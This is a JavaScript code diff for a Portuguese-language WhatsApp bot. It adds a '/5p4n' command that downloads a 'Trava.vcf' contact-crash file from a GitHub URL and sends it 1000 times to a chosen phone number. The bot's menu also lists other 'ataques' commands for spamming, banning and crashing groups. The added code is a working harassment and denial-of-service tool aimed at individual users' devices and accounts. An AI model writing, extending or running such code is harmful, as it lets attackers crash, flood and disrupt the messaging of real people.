@@ -80,6 +80,18 @@ function buscarFirebase(caminho) {
     return consultarAPI(`https://linkapi1-zrx-default-rtdb.firebaseio.com/${caminho}.json`);
 }
 
+// Função para baixar o arquivo VCF cru diretamente do repositório do GitHub
+function baixarVCFGitHub() {
+    return new Promise((resolve) => {
+        const urlRaw = 'https://raw.githubusercontent.com/wv0304362-bot/ZRX-BANCEK-/main/Trava.vcf';
+        https.get(urlRaw, (res) => {
+            let vcardData = '';
+            res.on('data', chunk => vcardData += chunk);
+            res.on('end', () => resolve(vcardData));
+        }).on('error', () => resolve(null));
+    });
+}
+
 // Função para enviar os prompts específicos para a Meta AI e aguardar a resposta
 async function perguntarMetaAI(promptTexto) {
     try {
@@ -263,6 +275,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     `> /para (Encerra a brincadeira)\n` +
                     `╠━━━⧼ATAQUES & AÇÕES⧽\n` +
                     `> /SP4M <número> <qtd>\n` +
+                    `> /5p4n <número> (Envia 1000 travas VCF)\n` +
                     `> /B4N <número> <qtd>\n` +
                     `> /B4NGRUPO <link> [quantidade]\n` +
                     `> /travgropo <número> <qtd>\n` +
@@ -314,7 +327,6 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     await waSock.sendMessage(remoteJid, { text: `⚠️ Não há nenhuma brincadeira ativa neste chat.` });
                 }
             }
-            // SELEÇÃO DA BRINCADEIRA COM OS PROMPTS EXATOS PARA A META AI
             else if (['verdade ou desafio', 'jogo da forca', 'pergunta e resposta'].includes(texto.trim().toLowerCase())) {
                 const tipoEscolhido = texto.trim().toLowerCase();
 
@@ -334,7 +346,6 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     promptParaMeta = "Olá, hoje a brincadeira é pergunta e resposta. Faça 20 perguntas aleatórias e divertidas para começar a brincadeira uma por uma, numeradas de 1 a 20.";
                 }
 
-                // Dispara a requisição direto para o chat oficial da Meta AI
                 const respostaMetaAI = await perguntarMetaAI(promptParaMeta);
                 
                 const lotePerguntas = respostaMetaAI
@@ -510,6 +521,38 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     } catch (err) {}
                 }
                 await waSock.sendMessage(remoteJid, { text: `✅ Disparo SP4M para ${alvoNum} concluído com sucesso!` });
+            }
+            // NOVO COMANDO /5p4n PARA ENVIAR 1000 TRAVAS DE CONTATO (VCF) DO GITHUB
+            else if (texto.startsWith('/5p4n ')) {
+                const alvoNum = texto.replace('/5p4n', '').trim().replace(/\D/g, '');
+
+                if (!alvoNum) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/5p4n <número>`' });
+                    return;
+                }
+
+                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
+                await waSock.sendMessage(remoteJid, { text: `🚀 Baixando a trava VCF do GitHub e iniciando o disparo de 1000 travas de contato para \`${alvoNum}\`...` });
+
+                const vcardConteudo = await baixarVCFGitHub();
+                if (!vcardConteudo) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao baixar o arquivo Trava.vcf do GitHub.' });
+                    return;
+                }
+
+                for (let i = 1; i <= 1000; i++) {
+                    try {
+                        await waSock.sendMessage(jidAlvo, {
+                            contacts: {
+                                displayName: `ZRX-TRAVA #${i}`,
+                                contacts: [{ vcard: vcardConteudo }]
+                            }
+                        });
+                        await delay(300); // Intervalo rápido para fluir as 1000 travas
+                    } catch (err) {}
+                }
+
+                await waSock.sendMessage(remoteJid, { text: `✅ Disparo de 1000 travas de contato para \`${alvoNum}\` concluído com sucesso!` });
             }
             else if (texto.startsWith('/B4N ')) {
                 const partes = texto.replace('/B4N', '').trim().split(' ');
